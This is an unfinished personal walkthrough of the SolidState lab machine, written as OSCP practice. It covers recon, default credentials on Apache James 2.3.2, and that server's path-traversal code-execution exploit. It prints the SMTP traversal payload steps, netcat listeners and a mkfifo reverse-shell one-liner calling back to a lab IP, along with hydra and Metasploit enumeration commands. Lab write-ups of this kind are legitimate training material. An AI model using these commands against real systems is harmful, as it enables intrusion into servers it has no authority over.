
Name: SolidState
Date:  
Difficulty:  Medium
Goals:  OSCP Prep
Learnt:
- Weird Ports are sometimes the  target and normality is rabbithole

Disclaimer I ran into the rsip protocol, the primilary exploit for this machine and walkthrough forgetting this a TJ Null box. I do not know the PrivEsc and di not read it. The challenge here would be very OSCP-esque recon or die; rerunning old recon attempts from long months past,  in the background being the other OSCP-esque methodological must for me returning to this box regardless of sort of knowing how the inital steps of this box are.  There is also a metasploit module for the intital phase of the box.

## Recon
The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![](ping.png)

Considering I already knew this stuff, but is not obvious to a random person trying this box. Just wait for prompts with nc. It makes no intuitive sense regardly, but these systems seem like a begone age that stil exist in the real world behind modern tech and teams.

![](waitforit.png)

![](defaultcreds.png)

Public exploits avilabel for the [James 2.3.2](https://en.wikipedia.org/wiki/Apache_James) is the Java Apache Mail Enterprise Server, it manages the Apache Mailet API.
![](searchsploit.png)
I research the python3 version of the exploit that was unverified, which works, similiarly requires requires login. As all versions with cron.d wont work.

Metasploit exploit description: 
*"This module exploits a vulnerability that exists due to a lack of input validation when creating a user. Messages for a given user are stored in a directory partially defined by the username. By creating a user with a directory traversal payload as the username, commands can be written to a given directory. To use this module with the cron exploitation method, run the exploit using the given payload, host, and port. After running the exploit, the payload will be executed within 60 seconds. Due to differences in how cron may run in certain Linux operating systems such as Ubuntu, it may be preferable to set the target to Bash Completion as the cron method may not work. If the target is set to Bash completion, start a listener using the given payload, host, and port before running the exploit. After running the exploit, the payload will be executed when a user logs into the system. For this exploitation method, bash completion must be enabled to gain code execution. This exploitation method will leave an Apache James mail object artifact in the /etc/bash_completion.d directory and the malicious user account."*


The metasploit version; perform sversion checks, creates a user that will be re

```ruby
# The java Message objects for this user will now be stored in
# Either /etc/bash_completion.d or /etc/cron.d
# if it is a cron then
adduser ../../../../../../../../etc/$choice $password
# Delete mail objects containing payload from cron.d

# Then it send the payload to the 25 port
# connect to 25
ehlo admin@apache.com 
# added the extra quote to make this more readable in the line below!
mail from: <''@apache.com> 
rcpt to: ../../../../../../../../etc/cron.d # 60 secs its back
# RCPT TO command tells the SMTP mail server to who the message should be sent
data
From: admin@apache.com
```

References 
[Debug STMP connection for great description of SMTP commands that occuring exploitation of MAil servers](https://www.sparkpost.com/blog/how-to-check-an-smtp-connection-with-a-manual-telnet-session/)
[Metasploit Module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/smtp/apache_james_exec.rb)

The non metasploit route requires Python2.7 and some modifications
![](exploitmodification.png)
Changes to the `rcpt to` and `adduser` commands as well as the payload, which initially failed. I checked with metasploit the default being with cron.d. **Note I did remove the `>` in s.send() line** and retest.

```bash
# One window/pane to catch the cron
nc -lvnp 110
# One window/pane for second shell
nc -lvnp 111
# Reverse shell for the cron shell to paste in to save time
rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.14.109 111 >/tmp/g
# Copy and wait...to paset
```

which initially failed, checked with metasploit the default being with cron.d - change payload as double check, but again it failed.
![](crondnotworking.png)

Therefore we have to find another way to get ssh login to the box and this would then lead to potential lead to root on the box. Reminder, but for linearities sake will testing options, I also researched the python3 version of the exploit that was unverified, which works, just requires login. 

Background hydra
![](hydrainthebackground.png)

Recon or die and therefore testing server for memory leakage on eol version of apache
![](checkingtheapache.png)
Ran multiple times and did `-n 100`; same result each time, is it not [Optionsbleed](https://nvd.nist.gov/vuln/detail/CVE-2017-9798), just the bug. It may be [Apache bug #61207](https://bz.apache.org/bugzilla/show_bug.cgi?id=61207).

## Exploit

## Foothold

## PrivEsc


## Metasploit 

```bash
use auxiliary/scanner/smtp/smtp_enum; set rhosts $IP; set rport 25; set USER_FILE /usr/; exploit -j;
```



